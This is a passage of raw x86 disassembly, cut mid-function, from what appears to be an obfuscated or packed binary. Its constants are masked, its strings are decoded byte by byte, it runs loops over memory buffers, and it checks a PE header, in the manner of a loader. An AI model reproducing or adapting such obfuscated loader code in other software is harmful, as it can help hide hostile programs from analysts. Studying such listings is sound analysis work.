  4261d7:	imul   eax,ecx
  4261da:	mov    ecx,DWORD PTR [ebp-0x8]
  4261dd:	mov    al,BYTE PTR [eax+ecx*1]
  4261e0:	mov    BYTE PTR [ebp-0x2],al
  4261e3:	mov    eax,DWORD PTR [ebp-0x1c]
  4261e6:	mov    ecx,DWORD PTR [ebp-0x44]
  4261e9:	xor    eax,ebx
  4261eb:	add    eax,esi
  4261ed:	imul   eax,ecx
  4261f0:	mov    ecx,DWORD PTR [ebp-0xe8]
  4261f6:	xor    ecx,ebx
  4261f8:	add    eax,ecx
  4261fa:	mov    ecx,DWORD PTR [ebp-0x8]
  4261fd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426205:	mov    ecx,DWORD PTR [ebp-0xe0]
  42620b:	xor    ecx,ebx
  42620d:	lea    eax,[ecx+eax*1+0x3272f1]
  426214:	movzx  ecx,BYTE PTR [ebp-0x2]
  426218:	xor    ecx,eax
  42621a:	mov    BYTE PTR [ebp-0x2],cl
  42621d:	mov    al,BYTE PTR [ebp-0x2]
  426220:	mov    ecx,DWORD PTR [ebp-0x1c]
  426223:	mov    edx,DWORD PTR [ebp-0x44]
  426226:	xor    ecx,ebx
  426228:	add    ecx,esi
  42622a:	imul   ecx,edx
  42622d:	mov    edx,DWORD PTR [ebp-0x8]
  426230:	mov    BYTE PTR [ecx+edx*1],al
  426233:	mov    eax,DWORD PTR [ebp-0x1c]
  426236:	mov    ecx,DWORD PTR [ebp-0x44]
  426239:	xor    eax,ebx
  42623b:	add    eax,esi
  42623d:	imul   eax,ecx
  426240:	mov    ecx,DWORD PTR [ebp-0x8]
  426243:	mov    al,BYTE PTR [eax+ecx*1]
  426246:	mov    BYTE PTR [ebp-0x2],al
  426249:	mov    eax,DWORD PTR [ebp-0x1c]
  42624c:	mov    ecx,DWORD PTR [ebp-0x44]
  42624f:	xor    eax,ebx
  426251:	add    eax,esi
  426253:	imul   eax,ecx
  426256:	mov    ecx,DWORD PTR [ebp-0x34]
  426259:	xor    ecx,ebx
  42625b:	add    eax,ecx
  42625d:	mov    ecx,DWORD PTR [ebp-0x8]
  426260:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426268:	mov    ecx,DWORD PTR [ebp-0xc4]
  42626e:	xor    ecx,ebx
  426270:	lea    eax,[ecx+eax*1+0x3272f1]
  426277:	movzx  ecx,BYTE PTR [ebp-0x2]
  42627b:	xor    ecx,eax
  42627d:	mov    BYTE PTR [ebp-0x2],cl
  426280:	mov    al,BYTE PTR [ebp-0x2]
  426283:	mov    ecx,DWORD PTR [ebp-0x1c]
  426286:	mov    edx,DWORD PTR [ebp-0x44]
  426289:	xor    ecx,ebx
  42628b:	add    ecx,esi
  42628d:	imul   ecx,edx
  426290:	mov    edx,DWORD PTR [ebp-0x8]
  426293:	mov    BYTE PTR [ecx+edx*1],al
  426296:	mov    eax,DWORD PTR [ebp-0x30]
  426299:	mov    ecx,DWORD PTR [ebp-0x34]
  42629c:	xor    eax,ebx
  42629e:	xor    ecx,ebx
  4262a0:	add    eax,esi
  4262a2:	add    ecx,esi
  4262a4:	imul   eax,ecx
  4262a7:	add    eax,DWORD PTR [ebp-0x44]
  4262aa:	mov    DWORD PTR [ebp-0x44],eax
  4262ad:	mov    eax,DWORD PTR [ebp-0x44]
  4262b0:	mov    ecx,DWORD PTR [ebp-0x14]
  4262b3:	cmp    ecx,eax
  4262b5:	jb     0x4261b9
  4262bb:	mov    eax,DWORD PTR [ebp-0x34]
  4262be:	mov    ecx,DWORD PTR [ebp-0x14]
  4262c1:	xor    eax,ebx
  4262c3:	add    eax,esi
  4262c5:	imul   eax,ecx
  4262c8:	mov    ecx,DWORD PTR [ebp-0x20]
  4262cb:	xor    ecx,ebx
  4262cd:	add    ecx,esi
  4262cf:	or     eax,ecx
  4262d1:	mov    ecx,DWORD PTR [ebp-0x2c]
  4262d4:	xor    ecx,ebx
  4262d6:	add    eax,ecx
  4262d8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4262db:	xor    ecx,ebx
  4262dd:	add    eax,ecx
  4262df:	mov    ecx,DWORD PTR [ebp-0xc]
  4262e2:	lea    eax,[eax+ecx*1+0x64e5e2]
  4262e9:	jmp    0x4262fa
  4262eb:	mov    eax,DWORD PTR [ebp-0x2c]
  4262ee:	mov    ecx,DWORD PTR [ebp-0xc]
  4262f1:	xor    eax,ebx
  4262f3:	lea    eax,[eax+ecx*1+0x3272f1]
  4262fa:	mov    DWORD PTR [ebp-0xc],eax
  4262fd:	mov    eax,DWORD PTR [ebp-0x2c]
  426300:	xor    eax,ebx
  426302:	mov    ecx,0xffcd8d0f
  426307:	sub    ecx,eax
  426309:	add    ecx,DWORD PTR [ebp-0x28]
  42630c:	mov    eax,DWORD PTR [ebp-0x2c]
  42630f:	mov    edx,DWORD PTR [ebp-0xc]
  426312:	xor    eax,ebx
  426314:	add    eax,esi
  426316:	imul   eax,edx
  426319:	cmp    eax,ecx
  42631b:	jbe    0x42612d
  426321:	mov    eax,DWORD PTR [ebp-0x10]
  426324:	mov    ecx,DWORD PTR [ebp-0x40]
  426327:	mov    eax,DWORD PTR [ebp+0x8]
  42632a:	mov    edx,DWORD PTR [ebp-0x54]
  42632d:	mov    eax,DWORD PTR [eax+0x1e0]
  426333:	xor    edx,ebx
  426335:	add    edx,esi
  426337:	push   edx
  426338:	mov    edx,DWORD PTR [ebp-0x3c]
  42633b:	xor    edx,ebx
  42633d:	add    edx,esi
  42633f:	push   edx
  426340:	push   ecx
  426341:	mov    DWORD PTR [ebp-0x30],ecx
  426344:	mov    ecx,DWORD PTR [ebp-0x10]
  426347:	xor    ecx,ebx
  426349:	add    ecx,esi
  42634b:	push   ecx
  42634c:	call   DWORD PTR [eax+0x14]
  42634f:	mov    edi,eax
  426351:	mov    eax,DWORD PTR [ebp-0x10]
  426354:	xor    eax,ebx
  426356:	add    eax,esi
  426358:	cmp    eax,edi
  42635a:	je     0x4263b5
  42635c:	mov    eax,DWORD PTR [ebp-0x10]
  42635f:	jmp    0x426382
  426361:	mov    ecx,DWORD PTR [ebp-0x24]
  426364:	xor    eax,ebx
  426366:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f1]
  42636d:	mov    BYTE PTR [eax+edi*1+0x3272f1],cl
  426374:	mov    ecx,DWORD PTR [ebp-0x18]
  426377:	xor    ecx,ebx
  426379:	lea    eax,[ecx+eax*1+0x3272f1]
  426380:	xor    eax,ebx
  426382:	mov    ecx,DWORD PTR [ebp-0x40]
  426385:	sub    ecx,esi
  426387:	xor    ecx,ebx
  426389:	cmp    eax,ecx
  42638b:	jne    0x426361
  42638d:	mov    eax,DWORD PTR [ebp+0x8]
  426390:	mov    ecx,DWORD PTR [ebp-0x50]
  426393:	mov    eax,DWORD PTR [eax+0x1e0]
  426399:	xor    ecx,ebx
  42639b:	add    ecx,esi
  42639d:	push   ecx
  42639e:	mov    ecx,DWORD PTR [ebp-0x10]
  4263a1:	xor    ecx,ebx
  4263a3:	add    ecx,esi
  4263a5:	push   ecx
  4263a6:	push   DWORD PTR [ebp-0x24]
  4263a9:	call   DWORD PTR [eax+0x18]
  4263ac:	mov    eax,DWORD PTR [ebp-0x30]
  4263af:	mov    DWORD PTR [ebp-0x24],edi
  4263b2:	mov    DWORD PTR [ebp-0x40],eax
  4263b5:	mov    edi,DWORD PTR [ebp-0x24]
  4263b8:	mov    eax,DWORD PTR [ebp-0x18]
  4263bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4263be:	xor    eax,ebx
  4263c0:	mov    DWORD PTR [ebp-0x30],edi
  4263c3:	add    eax,esi
  4263c5:	mov    DWORD PTR [ebp-0x5c],0x3c2b332b
  4263cc:	mov    DWORD PTR [ebp-0x58],0x362b3e2b
  4263d3:	jmp    0x426406
  4263d5:	xor    ecx,ebx
  4263d7:	mov    dl,BYTE PTR [ebp+ecx*1+0x327295]
  4263de:	xor    dl,0x7c
  4263e1:	inc    dl
  4263e3:	mov    DWORD PTR [ebp-0x3c],ecx
  4263e6:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f1]
  4263ee:	movzx  edx,dl
  4263f1:	cmp    ecx,edx
  4263f3:	jne    0x426410
  4263f5:	mov    ecx,DWORD PTR [ebp-0x18]
  4263f8:	mov    edx,DWORD PTR [ebp-0x3c]
  4263fb:	xor    ecx,ebx
  4263fd:	lea    ecx,[ecx+edx*1+0x3272f1]
  426404:	xor    ecx,ebx
  426406:	cmp    ecx,0xf89c85bd
  42640c:	jne    0x4263d5
  42640e:	jmp    0x426417
  426410:	mov    eax,DWORD PTR [ebp-0x10]
  426413:	xor    eax,ebx
  426415:	add    eax,esi
  426417:	mov    ecx,DWORD PTR [ebp-0x10]
  42641a:	xor    ecx,ebx
  42641c:	add    ecx,esi
  42641e:	cmp    ecx,eax
  426420:	je     0x426593
  426426:	mov    eax,DWORD PTR [edi+0x8]
  426429:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426430:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d4
  426437:	mov    DWORD PTR [ebp-0x48],0xf89cb5a5
  42643e:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  426445:	mov    DWORD PTR [ebp-0x14],eax
  426448:	mov    eax,DWORD PTR [ebp+0x8]
  42644b:	mov    ecx,DWORD PTR [ebp-0x20]
  42644e:	xor    ecx,ebx
  426450:	add    ecx,esi
  426452:	push   ecx
  426453:	mov    ecx,DWORD PTR [ebp-0x48]
  426456:	mov    eax,DWORD PTR [eax+0x1e0]
  42645c:	xor    ecx,ebx
  42645e:	add    ecx,esi
  426460:	push   ecx
  426461:	mov    ecx,DWORD PTR [ebp-0x3c]
  426464:	xor    ecx,ebx
  426466:	add    ecx,esi
  426468:	push   ecx
  426469:	mov    ecx,DWORD PTR [ebp-0xc]
  42646c:	xor    ecx,ebx
  42646e:	add    ecx,esi
  426470:	push   ecx
  426471:	call   DWORD PTR [eax+0x14]
  426474:	mov    edi,eax
  426476:	mov    eax,DWORD PTR [ebp+0x8]
  426479:	mov    ecx,DWORD PTR [ebp-0x20]
  42647c:	mov    eax,DWORD PTR [eax+0x1e0]
  426482:	xor    ecx,ebx
  426484:	add    ecx,esi
  426486:	push   ecx
  426487:	mov    ecx,DWORD PTR [ebp-0x48]
  42648a:	xor    ecx,ebx
  42648c:	add    ecx,esi
  42648e:	push   ecx
  42648f:	mov    ecx,DWORD PTR [ebp-0xc]
  426492:	push   DWORD PTR [ebp-0x14]
  426495:	xor    ecx,ebx
  426497:	add    ecx,esi
  426499:	push   ecx
  42649a:	call   DWORD PTR [eax+0x14]
  42649d:	mov    ecx,DWORD PTR [ebp-0xc]
  4264a0:	xor    ecx,ebx
  4264a2:	add    ecx,esi
  4264a4:	mov    DWORD PTR [ebp-0x20],eax
  4264a7:	cmp    ecx,edi
  4264a9:	je     0x426836
  4264af:	mov    ecx,DWORD PTR [ebp-0xc]
  4264b2:	xor    ecx,ebx
  4264b4:	add    ecx,esi
  4264b6:	cmp    ecx,eax
  4264b8:	je     0x426836
  4264be:	mov    DWORD PTR [ebp-0x3c],0xf89c85b8
  4264c5:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  4264cc:	mov    ecx,DWORD PTR [ebp-0x3c]
  4264cf:	xor    cl,0xaa
  4264d2:	sub    cl,0xf
  4264d5:	mov    BYTE PTR [edi],cl
  4264d7:	mov    ecx,DWORD PTR [ebp-0xc]
  4264da:	xor    cl,0xaa
  4264dd:	sub    cl,0xf
  4264e0:	mov    BYTE PTR [edi+0x1],cl
  4264e3:	mov    ecx,DWORD PTR [ebp-0x54]
  4264e6:	xor    cl,0xaa
  4264e9:	sub    cl,0xf
  4264ec:	mov    BYTE PTR [edi+0x2],cl
  4264ef:	and    DWORD PTR [ebp-0xc8],0x0
  4264f6:	and    DWORD PTR [ebp-0xdc],0x0
  4264fd:	lea    ecx,[ebp-0xdc]
  426503:	push   ecx
  426504:	push   DWORD PTR [ebp-0x14]
  426507:	push   eax
  426508:	lea    eax,[ebp-0xc8]
  42650e:	push   eax
  42650f:	mov    eax,DWORD PTR [ebp-0x30]
  426512:	push   DWORD PTR [eax+0xc]
  426515:	mov    eax,DWORD PTR [ebp-0x24]
  426518:	add    eax,0x10
  42651b:	push   eax
  42651c:	push   edi
  42651d:	call   0x4257c4
  426522:	mov    DWORD PTR [ebp-0x3c],eax
  426525:	mov    eax,DWORD PTR [ebp+0x8]
  426528:	mov    ecx,DWORD PTR [ebp-0x50]
  42652b:	mov    eax,DWORD PTR [eax+0x1e0]
  426531:	xor    ecx,ebx
  426533:	add    ecx,esi
  426535:	push   ecx
  426536:	mov    ecx,DWORD PTR [ebp-0xc]
  426539:	xor    ecx,ebx
  42653b:	add    ecx,esi
  42653d:	push   ecx
  42653e:	push   edi
  42653f:	call   DWORD PTR [eax+0x18]
  426542:	mov    eax,DWORD PTR [ebp-0x3c]
  426545:	add    eax,0xffcd8d0f
  42654a:	xor    eax,ebx
  42654c:	cmp    eax,0xf89c85a5
  426551:	mov    eax,DWORD PTR [ebp+0x8]
  426554:	mov    eax,DWORD PTR [eax+0x1e0]
  42655a:	mov    ecx,DWORD PTR [ebp-0x50]
  42655d:	jne    0x426580
  42655f:	xor    ecx,ebx
  426561:	add    ecx,esi
  426563:	push   ecx
  426564:	mov    ecx,DWORD PTR [ebp-0xc]
  426567:	xor    ecx,ebx
  426569:	add    ecx,esi
  42656b:	push   ecx
  42656c:	push   DWORD PTR [ebp-0x24]
  42656f:	call   DWORD PTR [eax+0x18]
  426572:	mov    eax,DWORD PTR [ebp-0x20]
  426575:	mov    DWORD PTR [ebp-0x24],eax
  426578:	mov    eax,DWORD PTR [ebp-0x14]
  42657b:	mov    DWORD PTR [ebp-0x40],eax
  42657e:	jmp    0x426593
  426580:	xor    ecx,ebx
  426582:	add    ecx,esi
  426584:	push   ecx
  426585:	mov    ecx,DWORD PTR [ebp-0xc]
  426588:	xor    ecx,ebx
  42658a:	add    ecx,esi
  42658c:	push   ecx
  42658d:	push   DWORD PTR [ebp-0x20]
  426590:	call   DWORD PTR [eax+0x18]
  426593:	mov    eax,DWORD PTR [ebp-0x40]
  426596:	mov    DWORD PTR [ebp-0x38],eax
  426599:	mov    eax,DWORD PTR [ebp-0x24]
  42659c:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  4265a3:	mov    DWORD PTR [ebp-0x3c],eax
  4265a6:	mov    edi,0xf89c85ba
  4265ab:	mov    DWORD PTR [ebp-0x2c],edi
  4265ae:	mov    eax,DWORD PTR [ebp-0x28]
  4265b1:	xor    eax,ebx
  4265b3:	add    eax,esi
  4265b5:	mov    DWORD PTR [ebp-0xc],eax
  4265b8:	mov    eax,DWORD PTR [ebp-0x28]
  4265bb:	xor    eax,ebx
  4265bd:	add    eax,esi
  4265bf:	mov    DWORD PTR [ebp-0x14],eax
  4265c2:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  4265c9:	mov    DWORD PTR [ebp-0x20],0xf89c85bc
  4265d0:	mov    eax,DWORD PTR [ebp-0x28]
  4265d3:	mov    ecx,DWORD PTR [ebp-0x38]
  4265d6:	xor    eax,ebx
  4265d8:	add    eax,esi
  4265da:	cmp    ecx,eax
  4265dc:	je     0x4267d2
  4265e2:	jmp    0x4267ae
  4265e7:	mov    ecx,DWORD PTR [ebp-0xc]
  4265ea:	mov    eax,DWORD PTR [ebp-0x38]
  4265ed:	sub    eax,ecx
  4265ef:	mov    ecx,DWORD PTR [ebp-0x48]
  4265f2:	xor    ecx,ebx
  4265f4:	add    ecx,esi
  4265f6:	xor    edx,edx
  4265f8:	div    ecx
  4265fa:	mov    DWORD PTR [ebp-0x14],eax
  4265fd:	mov    eax,DWORD PTR [ebp-0x20]
  426600:	mov    ecx,DWORD PTR [ebp-0x14]
  426603:	xor    eax,ebx
  426605:	add    eax,esi
  426607:	cmp    ecx,eax
  426609:	jbe    0x426615
  42660b:	mov    eax,DWORD PTR [ebp-0x20]
  42660e:	xor    eax,ebx
  426610:	add    eax,esi
  426612:	mov    DWORD PTR [ebp-0x14],eax
  426615:	mov    eax,DWORD PTR [ebp-0x48]
  426618:	mov    ecx,DWORD PTR [ebp-0x14]
  42661b:	xor    eax,ebx
  42661d:	add    eax,esi
  42661f:	imul   eax,ecx
  426622:	mov    DWORD PTR [ebp-0x14],eax
  426625:	mov    eax,DWORD PTR [ebp-0x28]
  426628:	mov    ecx,DWORD PTR [ebp-0x14]
  42662b:	xor    eax,ebx
  42662d:	add    eax,esi
  42662f:	cmp    ecx,eax
  426631:	je     0x42679c
  426637:	mov    eax,DWORD PTR [ebp-0x14]
  42663a:	mov    DWORD PTR [ebp-0x34],eax
  42663d:	mov    eax,DWORD PTR [ebp-0xc]
  426640:	add    eax,DWORD PTR [ebp-0x3c]
  426643:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  42664a:	mov    DWORD PTR [ebp-0x14],edi
  42664d:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  426654:	mov    DWORD PTR [ebp-0x1c],eax
  426657:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  42665e:	mov    DWORD PTR [ebp-0x8],edi
  426661:	mov    eax,DWORD PTR [ebp-0x4c]
  426664:	xor    eax,ebx
  426666:	add    eax,esi
  426668:	jmp    0x42675b
  42666d:	mov    DWORD PTR [ebp-0xe4],0xf89c85b0
  426677:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  426681:	mov    eax,DWORD PTR [ebp-0x8]
  426684:	mov    ecx,DWORD PTR [ebp-0x18]
  426687:	xor    eax,ebx
  426689:	add    eax,esi
  42668b:	imul   eax,ecx
  42668e:	mov    ecx,DWORD PTR [ebp-0x1c]
  426691:	mov    al,BYTE PTR [eax+ecx*1]
  426694:	mov    BYTE PTR [ebp-0x1],al
  426697:	mov    eax,DWORD PTR [ebp-0x8]
  42669a:	mov    ecx,DWORD PTR [ebp-0x18]
  42669d:	xor    eax,ebx
  42669f:	add    eax,esi
  4266a1:	imul   eax,ecx
  4266a4:	mov    ecx,DWORD PTR [ebp-0x54]
  4266a7:	xor    ecx,ebx
  4266a9:	add    eax,ecx
  4266ab:	mov    ecx,DWORD PTR [ebp-0x1c]
  4266ae:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  4266b6:	mov    ecx,DWORD PTR [ebp-0xe4]
  4266bc:	xor    ecx,ebx
  4266be:	lea    eax,[ecx+eax*1+0x3272f1]
  4266c5:	movzx  ecx,BYTE PTR [ebp-0x1]
  4266c9:	xor    ecx,eax
  4266cb:	mov    BYTE PTR [ebp-0x1],cl
  4266ce:	mov    al,BYTE PTR [ebp-0x1]
  4266d1:	mov    ecx,DWORD PTR [ebp-0x8]
  4266d4:	mov    edx,DWORD PTR [ebp-0x18]
  4266d7:	xor    ecx,ebx
  4266d9:	add    ecx,esi
  4266db:	imul   ecx,edx
  4266de:	mov    edx,DWORD PTR [ebp-0x1c]
  4266e1:	mov    BYTE PTR [ecx+edx*1],al
  4266e4:	mov    eax,DWORD PTR [ebp-0x8]
  4266e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4266ea:	xor    eax,ebx
  4266ec:	add    eax,esi
  4266ee:	imul   eax,ecx
  4266f1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4266f4:	mov    al,BYTE PTR [eax+ecx*1]
  4266f7:	mov    BYTE PTR [ebp-0x1],al
  4266fa:	mov    eax,DWORD PTR [ebp-0x8]
  4266fd:	mov    ecx,DWORD PTR [ebp-0x18]
  426700:	xor    eax,ebx
  426702:	add    eax,esi
  426704:	imul   eax,ecx
  426707:	mov    ecx,DWORD PTR [ebp-0x14]
  42670a:	xor    ecx,ebx
  42670c:	add    eax,ecx
  42670e:	mov    ecx,DWORD PTR [ebp-0x1c]
  426711:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426719:	mov    ecx,DWORD PTR [ebp-0xd0]
  42671f:	xor    ecx,ebx
  426721:	lea    eax,[ecx+eax*1+0x3272f1]
  426728:	movzx  ecx,BYTE PTR [ebp-0x1]
  42672c:	xor    ecx,eax
  42672e:	mov    BYTE PTR [ebp-0x1],cl
  426731:	mov    al,BYTE PTR [ebp-0x1]
  426734:	mov    ecx,DWORD PTR [ebp-0x8]
  426737:	mov    edx,DWORD PTR [ebp-0x18]
  42673a:	xor    ecx,ebx
  42673c:	add    ecx,esi
  42673e:	imul   ecx,edx
  426741:	mov    edx,DWORD PTR [ebp-0x1c]
  426744:	mov    BYTE PTR [ecx+edx*1],al
  426747:	mov    eax,DWORD PTR [ebp-0x30]
  42674a:	mov    ecx,DWORD PTR [ebp-0x14]
  42674d:	xor    eax,ebx
  42674f:	xor    ecx,ebx
  426751:	add    eax,esi
  426753:	add    ecx,esi
  426755:	imul   eax,ecx
  426758:	add    eax,DWORD PTR [ebp-0x18]
  42675b:	mov    DWORD PTR [ebp-0x18],eax
  42675e:	mov    eax,DWORD PTR [ebp-0x18]
  426761:	mov    ecx,DWORD PTR [ebp-0x34]
  426764:	cmp    ecx,eax
  426766:	jb     0x42666d
  42676c:	mov    eax,DWORD PTR [ebp-0x14]
  42676f:	mov    ecx,DWORD PTR [ebp-0x34]
  426772:	xor    eax,ebx
  426774:	add    eax,esi
  426776:	imul   eax,ecx
  426779:	mov    ecx,DWORD PTR [ebp-0x4c]
  42677c:	xor    ecx,ebx
  42677e:	add    ecx,esi
  426780:	or     eax,ecx
  426782:	mov    ecx,DWORD PTR [ebp-0x2c]
  426785:	xor    ecx,ebx
  426787:	add    eax,ecx
  426789:	mov    ecx,DWORD PTR [ebp-0x2c]
  42678c:	xor    ecx,ebx
  42678e:	add    eax,ecx
  426790:	mov    ecx,DWORD PTR [ebp-0xc]
  426793:	lea    eax,[eax+ecx*1+0x64e5e2]
  42679a:	jmp    0x4267ab
  42679c:	mov    eax,DWORD PTR [ebp-0x2c]
  42679f:	mov    ecx,DWORD PTR [ebp-0xc]
  4267a2:	xor    eax,ebx
  4267a4:	lea    eax,[eax+ecx*1+0x3272f1]
  4267ab:	mov    DWORD PTR [ebp-0xc],eax
  4267ae:	mov    eax,DWORD PTR [ebp-0x2c]
  4267b1:	xor    eax,ebx
  4267b3:	mov    ecx,0xffcd8d0f
  4267b8:	sub    ecx,eax
  4267ba:	add    ecx,DWORD PTR [ebp-0x38]
  4267bd:	mov    eax,DWORD PTR [ebp-0x2c]
  4267c0:	mov    edx,DWORD PTR [ebp-0xc]
  4267c3:	xor    eax,ebx
  4267c5:	add    eax,esi
  4267c7:	imul   eax,edx
  4267ca:	cmp    eax,ecx
  4267cc:	jbe    0x4265e7
  4267d2:	push   DWORD PTR [ebp+0x8]
  4267d5:	mov    eax,DWORD PTR [ebp+0x8]
  4267d8:	push   DWORD PTR [eax+0x1cc]
  4267de:	lea    eax,[ebp-0xd8]
  4267e4:	push   eax
  4267e5:	mov    eax,DWORD PTR [ebp+0x8]
  4267e8:	mov    eax,DWORD PTR [eax+0x1c4]
  4267ee:	push   DWORD PTR [eax]
  4267f0:	mov    eax,DWORD PTR [ebp+0x8]
  4267f3:	mov    eax,DWORD PTR [eax+0x1c0]
  4267f9:	push   DWORD PTR [eax]
  4267fb:	push   DWORD PTR [ebp-0x40]
  4267fe:	push   DWORD PTR [ebp-0x24]
  426801:	call   0x427298
  426806:	mov    DWORD PTR [ebp-0x3c],eax
  426809:	mov    eax,DWORD PTR [ebp-0x10]
  42680c:	mov    ecx,DWORD PTR [ebp-0x24]
  42680f:	xor    eax,ebx
  426811:	add    eax,esi
  426813:	cmp    eax,ecx
  426815:	je     0x426836
  426817:	mov    eax,DWORD PTR [ebp+0x8]
  42681a:	mov    ecx,DWORD PTR [ebp-0x50]
  42681d:	mov    eax,DWORD PTR [eax+0x1e0]
  426823:	xor    ecx,ebx
  426825:	add    ecx,esi
  426827:	push   ecx
  426828:	mov    ecx,DWORD PTR [ebp-0x10]
  42682b:	xor    ecx,ebx
  42682d:	add    ecx,esi
  42682f:	push   ecx
  426830:	push   DWORD PTR [ebp-0x24]
  426833:	call   DWORD PTR [eax+0x18]
  426836:	pop    edi
  426837:	pop    esi
  426838:	pop    ebx
  426839:	leave  
  42683a:	ret    0x4
  42683d:	push   ebp
  42683e:	mov    ebp,esp
  426840:	push   ecx
  426841:	push   ecx
  426842:	lea    eax,[ebp-0x8]
  426845:	mov    DWORD PTR [ebp-0x4],eax
  426848:	push   esi
  426849:	mov    esi,DWORD PTR [ebp-0x4]
  42684c:	mov    eax,0xf881ba2f
  426851:	mov    DWORD PTR [esi],eax
  426853:	mov    esi,DWORD PTR [ebp-0x8]
  426856:	cmp    esi,eax
  426858:	pop    esi
  426859:	jne    0x426863
  42685b:	mov    BYTE PTR [ecx+0xa],0x83
  42685f:	mov    BYTE PTR [edx+0x8],0x2e
  426863:	mov    BYTE PTR [edx+0xa],0x83
  426867:	mov    BYTE PTR [ecx+0x2],0x11
  42686b:	leave  
  42686c:	ret    
  42686d:	push   ebp
  42686e:	mov    ebp,esp
  426870:	push   ecx
  426871:	push   ecx
  426872:	lea    eax,[ebp-0x8]
  426875:	mov    DWORD PTR [ebp-0x4],eax
  426878:	mov    edx,DWORD PTR [ebp-0x4]
  42687b:	mov    eax,0xf88b0bc3
  426880:	mov    DWORD PTR [edx],eax
  426882:	mov    edx,DWORD PTR [ebp-0x8]
  426885:	cmp    edx,eax
  426887:	jne    0x426898
  426889:	mov    eax,DWORD PTR [ebp+0x8]
  42688c:	mov    BYTE PTR [ecx+0x9],0xf
  426890:	mov    BYTE PTR [eax+0x7],0x56
  426894:	mov    BYTE PTR [ecx+0x6],0xe
  426898:	mov    BYTE PTR [ecx+0x3],0x1f
  42689c:	leave  
  42689d:	ret    0x4
  4268a0:	push   ebp
  4268a1:	mov    ebp,esp
  4268a3:	push   ecx
  4268a4:	push   ecx
  4268a5:	lea    eax,[ebp-0x8]
  4268a8:	mov    DWORD PTR [ebp-0x4],eax
  4268ab:	mov    edx,DWORD PTR [ebp-0x4]
  4268ae:	mov    eax,0x7e0da2f
  4268b3:	mov    DWORD PTR [edx],eax
  4268b5:	mov    edx,DWORD PTR [ebp-0x8]
  4268b8:	cmp    edx,eax
  4268ba:	jne    0x4268c0
  4268bc:	mov    BYTE PTR [ecx+0x7],0x56
  4268c0:	mov    eax,DWORD PTR [ebp+0x8]
  4268c3:	mov    BYTE PTR [ecx+0x1],0x14
  4268c7:	mov    BYTE PTR [eax+0x9],0x2f
  4268cb:	leave  
  4268cc:	ret    0x4
  4268cf:	push   ebp
  4268d0:	mov    ebp,esp
  4268d2:	push   ecx
  4268d3:	push   ecx
  4268d4:	lea    eax,[ebp-0x8]
  4268d7:	mov    DWORD PTR [ebp-0x4],eax
  4268da:	push   esi
  4268db:	mov    esi,DWORD PTR [ebp-0x4]
  4268de:	mov    eax,0x7060e3c
  4268e3:	mov    DWORD PTR [esi],eax
  4268e5:	mov    esi,DWORD PTR [ebp-0x8]
  4268e8:	cmp    esi,eax
  4268ea:	pop    esi
  4268eb:	jne    0x4268f7
  4268ed:	mov    BYTE PTR [edx+0x4],0x12
  4268f1:	mov    WORD PTR [ecx+0x3],0x121f
  4268f7:	mov    BYTE PTR [edx],0x3e
  4268fa:	leave  
  4268fb:	ret    
  4268fc:	push   ebp
  4268fd:	mov    ebp,esp
  4268ff:	push   ecx
  426900:	push   ecx
  426901:	lea    eax,[ebp-0x8]
  426904:	mov    DWORD PTR [ebp-0x4],eax
  426907:	mov    edx,DWORD PTR [ebp-0x4]
  42690a:	mov    eax,0xf8870b3f
  42690f:	mov    DWORD PTR [edx],eax
  426911:	mov    edx,DWORD PTR [ebp-0x8]
  426914:	cmp    edx,eax
  426916:	jne    0x426923
  426918:	mov    eax,DWORD PTR [ebp+0x8]
  42691b:	mov    BYTE PTR [ecx+0x8],0xe
  42691f:	mov    BYTE PTR [eax+0x1],0x14
  426923:	mov    BYTE PTR [ecx+0x5],0xa
  426927:	leave  
  426928:	ret    0x4
  42692b:	push   esi
  42692c:	mov    ecx,edi
  42692e:	call   0x4268fc
  426933:	mov    edx,edi
  426935:	mov    ecx,esi
  426937:	mov    BYTE PTR [esi],0x1e
  42693a:	call   0x4268cf
  42693f:	push   esi
  426940:	mov    ecx,edi
  426942:	mov    BYTE PTR [esi+0x5],0xa
  426946:	call   0x4268a0
  42694b:	push   esi
  42694c:	mov    BYTE PTR [esi+0x6],0xe
  426950:	call   0x42686d
  426955:	mov    BYTE PTR [esi+0x2],0x11
  426959:	mov    edx,esi
  42695b:	jmp    0x42683d
  426960:	push   ebp
  426961:	mov    ebp,esp
  426963:	push   ecx
  426964:	mov    ecx,DWORD PTR [edx+0x194]
  42696a:	push   esi
  42696b:	mov    esi,DWORD PTR [ebp+0x8]
  42696e:	mov    esi,DWORD PTR [esi]
  426970:	mov    DWORD PTR [ecx],esi
  426972:	mov    ecx,DWORD PTR [edx+0x194]
  426978:	mov    ecx,DWORD PTR [ecx]
  42697a:	mov    esi,DWORD PTR [edx+0x190]
  426980:	mov    DWORD PTR [esi],ecx
  426982:	mov    eax,DWORD PTR [edx+0x194]
  426988:	mov    ecx,DWORD PTR [eax]
  42698a:	mov    ecx,DWORD PTR [ecx+0x3c]
  42698d:	add    ecx,DWORD PTR [eax]
  42698f:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  426996:	mov    eax,DWORD PTR [ebp-0x4]
  426999:	movzx  ecx,WORD PTR [ecx+0x16]
  42699d:	xor    eax,0x75108aa
  4269a2:	add    eax,0x3272f1
  4269a7:	pop    esi
  4269a8:	test   ecx,eax
  4269aa:	je     0x4269b8
  4269ac:	mov    eax,DWORD PTR [edx+0x1c8]
  4269b2:	mov    DWORD PTR [eax],0xf89c85ba
  4269b8:	leave  
